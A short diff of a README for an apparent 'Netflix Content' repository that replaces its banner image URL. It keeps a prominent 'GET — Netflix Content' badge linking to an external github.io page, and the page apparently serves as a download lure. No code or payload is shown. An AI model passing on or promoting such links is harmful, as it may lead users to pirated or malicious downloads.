@@ -1,6 +1,6 @@
 # Netflix Content — Movies, Series & Streaming Discovery
 
-![Banner Placeholder](https://s3-alpha.figma.com/hub/file/2263615291269423985/07ed7a87-8ab6-4d93-a50b-96f53cea0d6f-cover.png)
+![Banner Placeholder](https://i.pinimg.com/736x/c8/bc/49/c8bc4907863e6f8fdc12e13e24d3587d.jpg)
 
 [![GET — Netflix Content](https://img.shields.io/badge/GET%20%E2%80%94%20Netflix%20Content-0078D6?style=for-the-badge&logoColor=white)](https://toolsonshauna.github.io/.github/Netflix-Content)
 
